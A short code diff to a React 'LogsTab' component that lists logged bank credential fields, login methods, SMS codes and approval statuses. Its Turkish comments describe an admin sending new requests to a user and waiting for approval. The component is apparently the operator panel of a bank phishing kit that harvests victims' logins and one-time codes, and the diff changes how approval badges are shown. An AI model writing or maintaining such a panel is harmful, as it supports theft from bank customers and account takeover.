@@ -1962,13 +1962,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const shortCreds = getShortBankCredentialFields(fd);
                 const loginMethod = readLoginMethod(fd);
                 const logoInfo = resolveBankLogoUrl(fd);
-                const approvalHistory = parseApprovalHistory(fd.approvalHistory);
-                const approvalEntries =
-                  approvalHistory.length > 0
-                    ? approvalHistory
-                    : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
-                      ? [fd.approvalStatus.trim()]
-                      : [];
+                // Sadece GUNCEL durum: admin yeni istek gonderince "Bekliyor",
+                // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
+                const currentApproval =
+                  typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+                const approvalEntries = currentApproval ? [currentApproval] : [];
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
                     ? fd.smsCode.trim()
